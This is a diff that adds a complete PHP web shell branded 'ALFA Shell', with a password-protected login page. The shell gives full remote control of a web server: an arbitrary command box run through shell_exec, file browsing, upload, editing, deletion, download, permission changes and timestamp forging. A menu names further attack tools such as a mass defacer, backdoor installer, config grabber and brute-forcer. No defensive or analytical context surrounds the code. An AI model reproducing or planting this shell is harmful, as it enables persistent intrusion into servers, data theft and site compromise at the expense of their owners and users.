@@ -1,0 +1,550 @@
+<?php
+error_reporting(0);
+
+// ========== KONFIGURASI LOGIN (Cuma Password) ==========
+$password_hash = '$2a$12$LteC3F3JVGp7NWYrgKsklOGK.cYmZWyoaKehaR2/cprhm9vujioBm';
+$title = 'Fuqiang';
+
+// Cek cookie login
+$logged = false;
+if (isset($_COOKIE['shell_auth']) && $_COOKIE['shell_auth'] === md5($password_hash)) {
+    $logged = true;
+}
+
+// Proses login
+if (!$logged && isset($_POST['pass'])) {
+    if (password_verify($_POST['pass'], $password_hash)) {
+        setcookie('shell_auth', md5($password_hash), time() + 86400 * 7, '/');
+        $logged = true;
+        header('Location: ' . $_SERVER['PHP_SELF']);
+        exit;
+    } else {
+        $error = 'Password salah!';
+    }
+}
+
+// ========== HALAMAN LOGIN (Tampilan Fuqiang) ==========
+if (!$logged) {
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Fuqiang in here!</title>
+        <style>
+            @import url("https://fonts.googleapis.com/css2?family=Quicksand:wght@200;300;400;500;600;700&display=swap");
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+                font-family: "Quicksand", sans-serif;
+            }
+            body {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                min-height: 100vh;
+                width: 100%;
+                padding: 0 10px;
+            }
+            body::before {
+                content: "";
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                background: url("https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLzEFTrSexfvWHF3Q0FkoLu_qNW9JoPyWxHy5ePZE97BdA1KznzlB8-OdbRszy1xyIi35pi606UQusTEDt-EYo_Nii7m5BUeIvmEiitTUKIJOlZlniTQIKh82C5ASgQRgucOCwwfyiAorS9Hn8vyiBNOPYMdACDc4uF0a3rqavMaGMHFtpnRjK2wxXINVS/s16000/rudeus.png"), #000;
+                background-position: center;
+                background-size: cover;
+                background-attachment: fixed;
+            }
+            .wrapper {
+                width: 400px;
+                border-radius: 8px;
+                padding: 30px;
+                text-align: center;
+                border: 1px solid rgba(255, 255, 255, 0.5);
+                backdrop-filter: blur(8px);
+                background-color: #8b401699;
+                -webkit-backdrop-filter: blur(8px);
+            }
+            form {
+                display: flex;
+                flex-direction: column;
+            }
+            h2 {
+                font-size: 2rem;
+                margin-bottom: 20px;
+                color: #fff;
+            }
+            .input-field {
+                position: relative;
+                border-bottom: 2px solid #ccc;
+                margin: 15px 0;
+            }
+            .input-field label {
+                position: absolute;
+                top: 50%;
+                left: 0;
+                transform: translateY(-50%);
+                color: #fff;
+                font-size: 16px;
+                pointer-events: none;
+                transition: 0.15s ease;
+            }
+            .input-field input {
+                width: 100%;
+                height: 40px;
+                background: transparent;
+                border: none;
+                outline: none;
+                font-size: 16px;
+                color: #fff;
+            }
+            .input-field input:focus ~ label,
+            .input-field input:valid ~ label {
+                font-size: 0.8rem;
+                top: 10px;
+                transform: translateY(-120%);
+            }
+            button {
+                background: #fff;
+                color: #000;
+                font-weight: 600;
+                border: none;
+                padding: 12px 20px;
+                cursor: pointer;
+                border-radius: 8px;
+                font-size: 16px;
+                border: 2px solid transparent;
+                transition: 0.3s ease;
+                margin-top: 20px;
+            }
+            button:hover {
+                color: #fff;
+                border-color: #fff;
+                background: rgba(255, 255, 255, 0.15);
+            }
+            .error {
+                color: #ff6b6b;
+                margin-top: 15px;
+                text-align: center;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="wrapper">
+            <form method="POST">
+                <h2>'.$title.'</h2>
+                <div class="input-field">
+                    <input type="password" name="pass" id="pass" required autofocus>
+                    <label>Enter your password</label>
+                </div>
+                <button type="submit">Log In</button>';
+                if (isset($error)) echo '<div class="error">'.$error.'</div>';
+                echo '
+            </form>
+        </div>
+        <script>document.getElementById("pass").focus();</script>
+    </body>
+    </html>';
+    exit;
+}
+
+// ========== INI AWAL DARI ALFA SHELL VERSI LENGKAP ==========
+// Deteksi OS Windows
+$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+
+// Fungsi escape output HTML
+function x($str) {
+    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
+}
+
+// Fungsi format ukuran file
+function formatSize($bytes) {
+    if ($bytes < 1024) return $bytes . ' B';
+    $units = ['KB', 'MB', 'GB', 'TB'];
+    $i = 0;
+    while ($bytes >= 1024 && $i < count($units) - 1) {
+        $bytes /= 1024;
+        $i++;
+    }
+    return round($bytes, 2) . ' ' . $units[$i];
+}
+
+// Fungsi permission color
+function permColor($path) {
+    $perm = substr(sprintf('%o', fileperms($path)), -4);
+    if (preg_match('/^0?777$/', $perm)) {
+        return ' style="color:red;font-weight:bold;"';
+    }
+    return '';
+}
+
+// Ambil path input
+$inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();
+
+// Normalisasi path
+$currentPath = $isWindows
+    ? str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $inputPath)
+    : str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $inputPath);
+
+if (!is_dir($currentPath)) {
+    die("Direktori tidak valid: <code>" . x($currentPath) . "</code>");
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Upload file
+    if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
+        $targetPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
+        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
+            echo "<p style='color:green;'>File berhasil diupload.</p>";
+        } else {
+            echo "<p style='color:red;'>Upload gagal.</p>";
+        }
+    }
+
+    // Save edit
+    if (isset($_POST['save_edit'])) {
+        $edit_path = $_POST['edit_path'] ?? '';
+        $edit_content = $_POST['edit_content'] ?? '';
+        if ($edit_path && is_file($edit_path) && is_writable($edit_path)) {
+            file_put_contents($edit_path, $edit_content);
+            echo "<script>alert('File berhasil disimpan!');</script>";
+        } else {
+            echo "<script>alert('Gagal menyimpan file!');</script>";
+        }
+    }
+
+    $edit_file_path = '';
+    $edit_file_content = '';
+    if (isset($_POST['edit'])) {
+        $edit_file_path = $_POST['edit_path'];
+        if (is_file($edit_file_path) && is_readable($edit_file_path)) {
+            $edit_file_content = file_get_contents($edit_file_path);
+        }
+    }
+
+    // Buat folder
+    if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
+        $newFolder = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
+        if (!file_exists($newFolder)) {
+            if (mkdir($newFolder)) {
+                echo "<p style='color:green;'>Folder berhasil dibuat.</p>";
+            } else {
+                echo "<p style='color:red;'>Gagal membuat folder.</p>";
+            }
+        } else {
+            echo "<p style='color:red;'>Folder sudah ada.</p>";
+        }
+    }
+
+    // Buat file kosong
+    if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
+        $newFile = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
+        if (!file_exists($newFile)) {
+            if (file_put_contents($newFile, '') !== false) {
+                echo "<p style='color:green;'>File berhasil dibuat.</p>";
+            } else {
+                echo "<p style='color:red;'>Gagal membuat file.</p>";
+            }
+        } else {
+            echo "<p style='color:red;'>File sudah ada.</p>";
+        }
+    }
+
+    // Rename file/folder
+    if (isset($_POST['rename']) && !empty($_POST['rename_path']) && !empty($_POST['new_name'])) {
+        $oldPath = $_POST['rename_path'];
+        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
+        if (!file_exists($newPath)) {
+            if (rename($oldPath, $newPath)) {
+                echo "<p style='color:green;'>Berhasil rename.</p>";
+            } else {
+                echo "<p style='color:red;'>Rename gagal.</p>";
+            }
+        } else {
+            echo "<p style='color:red;'>Nama baru sudah ada.</p>";
+        }
+    }
+
+    // Ubah permission CHMOD
+    if (isset($_POST['change_perm']) && !empty($_POST['perm_path']) && !empty($_POST['permissions'])) {
+        $permPath = $_POST['perm_path'];
+        $permNum = intval($_POST['permissions'], 8);
+        if (chmod($permPath, $permNum)) {
+            echo "<p style='color:green;'>Permission berhasil diubah.</p>";
+        } else {
+            echo "<p style='color:red;'>Gagal mengubah permission.</p>";
+        }
+    }
+
+    // Ubah tanggal
+    if (isset($_POST['change_time']) && !empty($_POST['time_path']) && !empty($_POST['new_time'])) {
+        $timePath = $_POST['time_path'];
+        $newTime = strtotime($_POST['new_time']);
+        if ($newTime !== false && touch($timePath, $newTime)) {
+            echo "<p style='color:green;'>Tanggal berhasil diubah.</p>";
+        } else {
+            echo "<p style='color:red;'>Gagal mengubah tanggal.</p>";
+        }
+    }
+
+    // Hapus file/folder
+    if (isset($_POST['delete']) && !empty($_POST['delete_path'])) {
+        $delPath = $_POST['delete_path'];
+        if (is_dir($delPath)) {
+            if (@rmdir($delPath)) {
+                echo "<p style='color:green;'>Folder berhasil dihapus.</p>";
+            } else {
+                echo "<p style='color:red;'>Gagal menghapus folder (pastikan kosong).</p>";
+            }
+        } else {
+            if (@unlink($delPath)) {
+                echo "<p style='color:green;'>File berhasil dihapus.</p>";
+            } else {
+                echo "<p style='color:red;'>Gagal menghapus file.</p>";
+            }
+        }
+    }
+}
+?>
+<script>
+function confirmDelete() {
+    return confirm("Yakin ingin menghapus item ini?");
+}
+</script>
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>ALFA Shell | <?=htmlspecialchars($currentPath)?></title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; margin: 10px; font-size: 13px; }
+        a { color: #0f0; text-decoration: none; }
+        a:hover { color: #fff; text-decoration: underline; }
+        hr { border: none; border-top: 1px dashed #0f0; margin: 5px 0; }
+        .info-line { margin: 2px 0; }
+        .menu-bar { margin: 10px 0; line-height: 1.8; }
+        .menu-bar a { margin-right: 5px; }
+        table { border-collapse: collapse; width: 100%; margin-top: 10px; }
+        th, td { border: 1px solid #0f0; padding: 3px 5px; text-align: left; }
+        th { background: #0a0; color: #000; }
+        input, textarea, select { background: #111; color: #0f0; border: 1px solid #0f0; padding: 3px; font-family: monospace; }
+        button, input[type=submit] { background: #000; color: #0f0; border: 1px solid #0f0; padding: 3px 8px; cursor: pointer; font-family: monospace; }
+        button:hover, input[type=submit]:hover { background: #0f0; color: #000; }
+        pre { background: #111; padding: 10px; overflow: auto; border: 1px solid #0f0; margin-top: 10px; }
+        .warning { color: #ff0; background: #111; padding: 5px; margin: 10px 0; border-left: 3px solid #f00; }
+        .form-container { display: flex; gap: 20px; align-items: flex-start; }
+        form { display: flex; gap: 8px; }
+        input[type="file"], input[type="text"] { padding: 6px 8px; font-size: 12px; }
+        button { padding: 6px 12px; font-size: 12px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<pre style="background:#000; border:none; padding:0; margin:0;">
+# <?=htmlspecialchars(php_uname())?>
+
+User: <?=function_exists('exec') ? exec('whoami') : get_current_user()?> | Group: <?=function_exists('exec') ? exec('groups') : '-'.' [ '.get_current_user().' ]'?>
+
+Safe Mode: <?=ini_get('safe_mode') ? 'ON' : 'OFF'?>  
+Your IP: <?=$_SERVER['REMOTE_ADDR'] ?? '-'?>
+
+DateTime: <?=date('Y-m-d H:i:s')?>
+Domains: - 
+HDD: Total: - Free: -
+
+Disable Functions: <?=ini_get('disable_functions') ?: 'None'?>
+
+CURL: <?=extension_loaded('curl') ? 'ON' : 'OFF'?> | MySQL: <?=extension_loaded('mysqli') ? 'ON' : 'OFF'?>
+
+PWD: <?=htmlspecialchars($currentPath)?> [ <a href="#" onclick="navigator.clipboard.writeText('<?=htmlspecialchars($currentPath)?>');return false;">Home Shell</a> ]
+</pre>
+
+<hr>
+
+<!-- MENU TOOLS -->
+<div class="menu-bar">
+    <a href="#">Process</a> | <a href="#">Eval</a> | <a href="#">SQL Manager</a> | <a href="#">Database Dumper</a> | <a href="#">Column Dumper</a> | <a href="#">En-Decoder</a> | <a href="#">BC</a> | <a href="#">ZONE-H</a> | <a href="#">DDOS</a> | <a href="#">ByPasser</a> | <a href="#">Cgi Shell</a> | <a href="#">SSI SHELL</a> | <a href="#">Hash Tools</a> | <a href="#">Port Scanner</a> | <a href="#">Open BaseDir</a><br>
+    <a href="#">Fake Mail</a> | <a href="#">Compressor</a> | <a href="#">DeCompressor</a> | <a href="#">Index Changer</a> | <a href="#">Add New Admin</a> | <a href="#">Shell Injectors</a> | <a href="#">PHP2XML</a> | <a href="#">CloudFlare</a> | <a href="#">Whmcs Decoder</a> | <a href="#">Symlink</a> | <a href="#">Mass Defacer</a> | <a href="#">BruteForcer</a> | <a href="#">Searcher</a><br>
+    <a href="#">Config Grabber</a> | <a href="#">Fake Page</a> | <a href="#">Archive Manager</a> | <a href="#">CMS Hijacker</a> | <a href="#">Remote Upload</a> | <a href="#">Install BackDoor</a> | <a href="#">Whois</a> | <a href="#">Remove Shell</a>
+</div>
+
+<hr>
+
+<!-- Alfa Settings & About Us -->
+<div class="menu-bar">
+    <a href="#">Alfa Settings</a> | <a href="#">About Us</a>
+</div>
+
+<hr>
+
+<!-- Buttons: form, New Tab + -->
+<div class="menu-bar">
+    <b>Buttons:</b><br>
+    <a href="#">form</a> | <a href="#">New Tab +</a>
+</div>
+
+<hr>
+
+<!-- Filter -->
+<div class="menu-bar">
+    <b>Filter:</b><br>
+    Sort By: <select><option>Name</option><option>Size</option><option>Date</option></select>
+    Direction: <select><option>Ascending</option><option>Descending</option></select>
+    limit: <input type="text" size="3" value="0">
+    Files Count: <?=count(scandir($currentPath)) - 2?>
+</div>
+
+<hr>
+
+<!-- WARNING -->
+<div class="warning">
+    ⚠️ Warning: ALFA Shell Active
+</div>
+
+<!-- UPLOAD & MKDIR FORM -->
+<div class="form-container">
+    <form method="POST" enctype="multipart/form-data" action="">
+        <input type="file" name="uploaded_file" required>
+        <button type="submit" name="upload">Upload</button>
+    </form>
+
+    <form method="POST">
+        <input type="text" name="file_name" placeholder="Nama file (misal: file.txt)" required>
+        <button type="submit" name="create_file">Buat File</button>
+    </form>
+
+    <form method="POST">
+        <input type="text" name="folder_name" placeholder="Nama folder" required>
+        <button type="submit" name="create_folder">Buat Folder</button>
+    </form>
+</div>
+
+<!-- FILE MANAGER TABLE -->
+<h3>form</h3>
+<table>
+    <thead>
+        <th>Name</th>
+        <th>Size</th>
+        <th>Perm</th>
+        <th>Action</th>
+    </thead>
+    <tbody>
+    <?php
+    $items = scandir($currentPath);
+    $folders = [];
+    $files = [];
+    foreach ($items as $item) {
+        if ($item === '.' || $item === '..') continue;
+        $fullPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
+        if (is_dir($fullPath)) {
+            $folders[] = $item;
+        } else {
+            $files[] = $item;
+        }
+    }
+    $sortedItems = array_merge($folders, $files);
+
+    foreach ($sortedItems as $item) {
+        $fullPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
+        $is_dir = is_dir($fullPath);
+        $size = $is_dir ? '-' : filesize($fullPath);
+        $perms = substr(sprintf('%o', fileperms($fullPath)), -4);
+    ?>
+    <tr>
+        <td>
+            <?php if ($is_dir): ?>
+                📁 <a href="?d=<?=urlencode($fullPath)?>"><?=htmlspecialchars($item)?>/</a>
+            <?php else: ?>
+                📄 <a href="?a=view&file=<?=urlencode($item)?>&d=<?=urlencode($currentPath)?>"><?=htmlspecialchars($item)?></a>
+            <?php endif; ?>
+        </td>
+        <td><?=$size?></td>
+        <td<?=permColor($fullPath)?>><?=$perms?></td>
+        <td>
+            <?php if (!$is_dir): ?>
+            <a href="?a=edit&file=<?=urlencode($item)?>&d=<?=urlencode($currentPath)?>">Edit</a> | 
+            <a href="?a=download&file=<?=urlencode($item)?>&d=<?=urlencode($currentPath)?>">DL</a> | 
+            <?php endif; ?>
+            <form method="POST" style="display:inline;" onsubmit="return confirmDelete();">
+                <input type="hidden" name="delete_path" value="<?=x($fullPath)?>">
+                <button type="submit" name="delete">Del</button>
+            </form>
+        </td>
+    </tr>
+    <?php } ?>
+    </tbody>
+</table>
+
+<!-- COMMAND EXECUTOR -->
+<div style="margin-top:15px;">
+    <form method="POST" action="">
+        <input type="text" name="cmd" placeholder="Perintah (ls -la, whoami, dll)" size="70">
+        <button type="submit" name="execute_cmd">Execute</button>
+    </form>
+    <?php 
+    if (isset($_POST['execute_cmd']) && isset($_POST['cmd'])) {
+        $cmd = $_POST['cmd'];
+        $output = shell_exec($cmd . " 2>&1");
+        if ($output === null) $output = "Command execution failed";
+        echo '<pre>' . htmlspecialchars($output) . '</pre>';
+    }
+    ?>
+</div>
+
+<!-- FOOTER URL -->
+<hr>
+<div style="margin-top:10px; color:#888; word-break:break-all;">
+    https://<?=$_SERVER['HTTP_HOST']?><?=$_SERVER['SCRIPT_NAME']?>
+</div>
+
+<?php
+// VIEW FILE
+if (isset($_GET['a']) && $_GET['a'] == 'view' && isset($_GET['file'])): 
+    $file = $currentPath . '/' . basename($_GET['file']);
+    if (is_file($file) && is_readable($file)):
+        $content = htmlspecialchars(file_get_contents($file));
+?>
+    <h3>View: <?=htmlspecialchars(basename($file))?></h3>
+    <pre style="max-height:400px;"><?=$content?></pre>
+    <a href="?a=edit&file=<?=urlencode(basename($file))?>&d=<?=urlencode($currentPath)?>">Edit</a>
+<?php endif; endif; ?>
+
+<?php
+// EDIT FILE
+if (isset($_GET['a']) && $_GET['a'] == 'edit' && isset($_GET['file'])):
+    $file = $currentPath . '/' . basename($_GET['file']);
+    if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['content'])) {
+        file_put_contents($file, $_POST['content']);
+        echo "<div style='color:#0f0;'>Saved!</div>";
+        $content = htmlspecialchars($_POST['content']);
+    } else {
+        $content = htmlspecialchars(file_get_contents($file));
+    }
+?>
+    <h3>Edit: <?=htmlspecialchars(basename($file))?></h3>
+    <form method="post">
+        <textarea name="content" rows="20" style="width:100%; background:#111; color:#0f0; border:1px solid #0f0;"><?=$content?></textarea><br>
+        <button type="submit">Save</button>
+        <a href="?a=view&file=<?=urlencode(basename($file))?>&d=<?=urlencode($currentPath)?>">Cancel</a>
+    </form>
+<?php endif; ?>
+
+<?php
+// DOWNLOAD FILE
+if (isset($_GET['a']) && $_GET['a'] == 'download' && isset($_GET['file'])):
+    $file = $currentPath . '/' . basename($_GET['file']);
+    if (is_file($file)) {
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="'.basename($file).'"');
+        readfile($file);
+        exit;
+    }
+endif;
+?>
+
+</body>
+</html>
